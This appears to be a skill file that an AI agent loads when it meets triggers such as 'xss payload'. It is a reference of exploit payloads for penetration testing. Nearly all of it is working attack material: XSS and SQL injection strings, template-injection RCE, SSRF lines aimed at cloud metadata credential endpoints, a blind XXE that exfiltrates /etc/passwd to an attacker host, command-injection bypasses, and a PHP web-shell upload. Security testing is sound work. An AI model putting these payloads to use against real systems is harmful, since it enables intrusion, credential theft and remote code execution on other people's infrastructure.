---
name: security-payloads
description: Use when you need a specific exploit payload — XSS, SQLi, SSTI, SSRF, XXE, file upload bypass, auth bypass, command injection. Points to PayloadsAllTheThings + SecLists/Fuzzing locations, plus inline canonical payloads for the most common cases. Triggers on "xss payload", "sqli payload", "ssti payload", "ssrf bypass", "xxe payload", "command injection".
---

# Exploit payload reference

PayloadsAllTheThings + SecLists are cloned locally — see `security-wordlists` skill for paths. This skill gives you the most useful payloads inline and points to the right cheatsheet for depth.

## XSS

```html
<!-- Probes -->
"><script>alert(1)</script>
'><svg/onload=alert(1)>
javascript:alert(1)

<!-- Filter bypass -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">click</a>

<!-- Mutation XSS (mXSS) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- DOM XSS in URL hash -->
#<img src=x onerror=alert(1)>
```

CSP bypass: depends on policy. Look for `unsafe-inline`, JSONP endpoints in allowlist, base-uri tricks. Cheatsheet: `/opt/PayloadsAllTheThings/XSS Injection/README.md` (Termux: `~/tools/...`).

## SQLi

```sql
-- Detection
'
" OR "1"="1
1' OR '1'='1'-- -
1) OR (1=1)-- -

-- UNION (replace N with column count from ORDER BY discovery)
1' UNION SELECT 1,2,3,...,N-- -

-- Time-based blind
1' AND SLEEP(5)-- -                       -- MySQL
1'; WAITFOR DELAY '0:0:5'-- -             -- MSSQL
1' AND pg_sleep(5)-- -                    -- Postgres

-- Out-of-band (Oracle)
1' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % a SYSTEM "http://attacker/'||user||'">%a;]>'),'/l') FROM dual-- -
```

For complex cases use `sqlmap`. Cheatsheet: `/opt/PayloadsAllTheThings/SQL Injection/` (Termux: `~/tools/...`).

## SSTI

```text
{{7*7}}                  # Jinja2 / Twig: 49
${7*7}                   # FreeMarker / Velocity / SpEL
<%= 7*7 %>               # ERB / EJS
#{7*7}                   # Ruby / Smarty
${{7*7}}                 # Handlebars: literal
@{7*7}                   # Razor

# Jinja2 RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Twig RCE
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}

# FreeMarker RCE
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```

## SSRF

```text
# Cloud metadata
http://169.254.169.254/latest/meta-data/                                # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> # AWS creds
http://metadata.google.internal/computeMetadata/v1/                     # GCP (header: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01         # Azure (header: Metadata: true)
http://100.100.100.200/latest/meta-data/                                # Alibaba

# localhost bypass
http://127.0.0.1
http://0.0.0.0
http://0
http://127.1
http://[::1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://2130706433              # decimal of 127.0.0.1
http://017700000001            # octal
http://0x7f000001              # hex

# DNS rebinding (use rbndr.us, your own service)
http://7f000001.rbndr.us/

# Gopher (raw TCP)
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%20pwn

# File scheme
file:///etc/passwd
file://localhost/etc/passwd
```

## XXE

```xml
<!-- Generic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Blind out-of-band -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>

<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?x=%file;'>">
%all;
```

## Command injection

```bash
;id
|id
&&id
||id
`id`
$(id)

# Filter bypasses (no spaces)
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat</etc/passwd

# No quotes/slash
cat${IFS}$(echo${IFS}-n${IFS}'L2V0Yy9wYXNzd2Q='|base64${IFS}-d)
```

## File upload bypasses

Try in order:

1. `shell.php`
2. `shell.phtml`, `shell.php5`, `shell.phar`, `shell.phps`
3. `shell.php.jpg`, `shell.jpg.php`
4. `shell.php%00.jpg` (null byte)
5. `Content-Type: image/jpeg` with PHP body
6. `GIF89a<?php system($_GET[0]); ?>` (magic byte prefix)
7. `.htaccess` upload to remap
8. `.ht_access` if `.htaccess` blocked
9. SVG with `<script>` tag

## Path traversal

```text
../../../etc/passwd
....//....//....//etc/passwd       # double encoding strip
%2e%2e%2f%2e%2e%2fetc/passwd       # URL encode
%252e%252e%252fetc/passwd          # double URL encode
..%c0%af..%c0%afetc/passwd         # UTF-8 overlong
```

## JWT

```bash
jwt_tool $TOKEN -X a               # alg=none
jwt_tool $TOKEN -X i               # weak HMAC, brute
jwt_tool $TOKEN -X k -pk pub.pem   # key confusion (RS→HS)
jwt_tool $TOKEN -X kid             # kid SQL injection / path traversal
jwt_tool $TOKEN -X jku             # jku spoofing
```

## When in doubt

`${GITHUB_TOOL_DIR:-/opt}/PayloadsAllTheThings/<vuln>/README.md` is the canonical cheatsheet — `/opt/...` on Linux, `~/tools/...` on Termux. Open that file; it updates faster than any inline list.
